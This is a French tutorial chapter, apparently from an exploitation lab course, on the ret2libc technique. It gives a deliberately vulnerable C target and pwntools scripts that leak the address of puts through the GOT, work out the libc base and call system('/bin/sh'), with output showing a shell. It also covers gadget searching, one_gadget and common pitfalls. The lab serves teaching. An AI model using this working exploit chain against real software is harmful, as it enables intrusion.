# 07 — Ret2libc

[← Module](README.md)

## Objectif

Appeler une fonction de la libc alors que l'ASLR randomise son adresse : fuiter une adresse réelle
via la GOT, en déduire la base, puis sauter sur `system`.

## Le problème

Avec `NX`, pas de shellcode. Avec ASLR, pas d'adresse fixe pour `system`. Mais le binaire contient
des stubs PLT qui appellent la libc : `puts@plt`. Et la GOT contient l'adresse réelle de `puts`
une fois la libc chargée. La chaîne logique tient en trois étapes :

1. appeler `puts(puts@got)` — le binaire affiche l'adresse réelle de `puts` ;
2. soustraire l'offset de `puts` dans la libc : on obtient la base ;
3. rappeler la faille et sauter sur `base + system`, avec `"/bin/sh"` en argument.

## La cible

```c
/* ret2libc.c — compilation :
   gcc -fno-stack-protector -no-pie -o ret2libc ret2libc.c */
#include <stdio.h>
#include <unistd.h>

/* Gadget planté pour le lab : sur un vrai binaire, on le cherche avec ROP(). */
__attribute__((naked)) void pop_rdi_ret(void) {
    __asm__ volatile("pop %rdi\n\tret");
}

void vuln(void) {
    char buf[64];
    read(0, buf, 200);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("Entree :");
    vuln();
    return 0;
}
```

Le gadget `pop rdi; ret` est nécessaire pour passer un argument : en x86-64, le premier argument
d'une fonction va dans `rdi`. Un binaire compilé avec les outils actuels n'en contient pas
forcément — les anciens en avaient un dans `__libc_csu_init`, disparu avec les glibc récentes.
Sur un vrai challenge, on le cherche :

```python
rop = ROP(elf)
rop.find_gadget(["pop rdi", "ret"])
```

```bash
ROPgadget --binary ./ret2libc | grep "pop rdi"
```

Ici, le gadget est présent dans le binaire à une adresse connue, ce qui permet de se concentrer
sur la chaîne elle-même.

## Les adresses du binaire

```python
from pwn import *

context.binary = elf = ELF("./ret2libc", checksec=False)
print("pop rdi   :", hex(elf.symbols["pop_rdi_ret"]))
print("puts@plt  :", hex(elf.plt["puts"]))
print("puts@got  :", hex(elf.got["puts"]))
print("vuln      :", hex(elf.symbols["vuln"]))
```

```text
pop rdi   : 0x401146
puts@plt  : 0x401030
puts@got  : 0x404000
vuln      : 0x40114b
```

## Les offsets dans la libc

```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
print("puts   :", hex(libc.symbols["puts"]))
print("system :", hex(libc.symbols["system"]))
print("/bin/sh:", hex(next(libc.search(b"/bin/sh"))))
```

```text
puts   : 0x802c0
system : 0x53090
/bin/sh: 0x1a5ea4
```

Ces trois valeurs sont propres à la libc installée. Sur une cible distante, il faut la bonne
version : `libc-database`, ou la fuite elle-même comparée aux bases connues (`libc.rip`).

## Étape 1 : la fuite

```python
OFFSET = 72
POP_RDI = elf.symbols["pop_rdi_ret"]

stage1  = b"A" * OFFSET
stage1 += p64(POP_RDI) + p64(elf.got["puts"])   # rdi = &puts
stage1 += p64(elf.plt["puts"])                  # puts(&puts) -> affiche l'adresse
stage1 += p64(elf.symbols["vuln"])              # on revient dans la faille

io = process("./ret2libc")
io.recvuntil(b"Entree :\n")
io.send(stage1)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print("puts leak :", hex(leak))
```

```text
puts leak : 0x77bed29602c0
```

`ljust(8, b"\x00")` complète à 8 octets : `puts` s'arrête au premier octet nul, la fuite est donc
plus courte que 8 octets une fois sur 256. Sans ce complément, `u64` lève une erreur — ou pire,
renvoie une valeur fausse.

## Étape 2 : la base, puis la chaîne finale

```python
base = leak - libc.symbols["puts"]
print("libc base :", hex(base))

binsh  = base + next(libc.search(b"/bin/sh"))
system = base + libc.symbols["system"]

stage2  = b"A" * OFFSET
stage2 += p64(POP_RDI) + p64(binsh)
stage2 += p64(POP_RDI + 1)      # le "ret" du gadget, pour l'alignement
stage2 += p64(system)
io.send(stage2)
io.sendline(b"echo PWNED; id")
print(io.recvall(timeout=3).decode(errors="replace").strip())
```

```text
libc base : 0x77bed28e0000
PWNED
uid=10001(openhands) gid=10001(openhands) groups=10001(openhands),27(sudo)
```

`POP_RDI + 1` désigne l'octet `0xc3` (`ret`) juste après le `pop rdi` : c'est le gadget
d'alignement du chapitre 06, récupéré sans chercher ailleurs.

## Vérifier la base

Une base libc est toujours alignée sur une page (`0x1000`). Si le résultat ne l'est pas, la fuite
est fausse :

```python
assert base & 0xfff == 0, "fuite invalide"
```

Ce test vaut mieux qu'un long débogage : il attrape immédiatement une ligne mal lue ou un offset
libc qui ne correspond pas à la cible.

## Sans gadget dans le binaire

Trois issues, dans l'ordre de préférence :

1. **ret2csu** : les gadgets de `__libc_csu_init`, quand le binaire en possède encore ;
2. **gadget dans la libc** : après une première fuite, `base + pop_rdi_offset` ;
3. **one_gadget** : `one_gadget libc.so.6`, qui donne des adresses de `execve("/bin/sh")` directes,
   avec des contraintes de registres à respecter.

## Pièges

| Symptôme | Cause |
| --- | --- |
| Base non alignée | fuite décalée : `recvline()` a attrapé autre chose |
| `system` appelé mais pas de shell | pile mal alignée : ajouter le `ret` |
| `SIGSEGV` dans `system` | mauvais offset libc : version différente de la cible |
| Leak de 6 octets | octet nul dans l'adresse : `ljust(8, b"\x00")` obligatoire |

## À retenir

- Fuiter une adresse de la GOT, soustraire son offset libc, obtenir la base.
- `pop rdi; ret` place le premier argument ; sans lui, il faut un autre chemin.
- L'alignement se règle avec un `ret` avant l'appel.
- Une base non alignée sur `0x1000` signale une fuite ratée, pas un bug de libc.
